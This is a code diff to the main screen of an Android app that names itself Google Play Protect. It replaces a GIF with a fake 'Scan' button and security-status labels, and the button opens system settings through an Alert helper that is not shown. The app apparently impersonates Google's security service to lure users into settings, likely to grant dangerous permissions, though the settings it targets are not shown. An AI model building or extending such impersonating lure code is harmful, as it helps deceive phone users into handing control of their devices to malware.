@@ -9,49 +9,32 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.provider.Settings;
 import android.text.TextUtils;
+import android.widget.Button;
+import android.widget.TextView;
+import android.os.Bundle;
+import android.widget.ImageView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.NotificationCompat;
-import pl.droidsonroids.gif.GifDrawable;
-import pl.droidsonroids.gif.GifImageView;
+
 
 import com.GooglePlayProtectService.R;
 
 public class MainActivity extends AppCompatActivity {
 	private static final String CHANNEL_ID = "GooglePlayProtectChannel";
-	private GifDrawable gifDrawable;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.layout);
 
-		GifImageView gifImageView = findViewById(R.id.gifImageView);
+		Button scanButton = findViewById(R.id.btnScan);
+		TextView securityStatus = findViewById(R.id.tvStatus);
+		TextView lastScanned = findViewById(R.id.tvLastScanned);
 
-		// Initialize the GifDrawable
-		try {
-			gifDrawable = new GifDrawable(getResources(), R.drawable.all_good);
-			gifDrawable.stop(); // Pause the GIF initially
-			gifImageView.setImageDrawable(gifDrawable);
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-
-		// Set up OnClickListener for the GifImageView
-		gifImageView.setOnClickListener(v -> {
-            if (gifDrawable != null && !gifDrawable.isPlaying()) {
-                gifDrawable.setLoopCount(1); // Play only once
-                gifDrawable.start();
-
-                // Reset the GIF to its initial frame after it finishes playing
-                new Handler().postDelayed(() -> {
-                    if (gifDrawable != null) {
-                        gifDrawable.seekToFrame(0);
-                        gifDrawable.stop();
-                    }
-                }, gifDrawable.getDuration());
-            }
-        });
+		scanButton.setOnClickListener(v -> {
+			Alert.openSettings(this);
+		});
 
 
 		// Show the custom notification
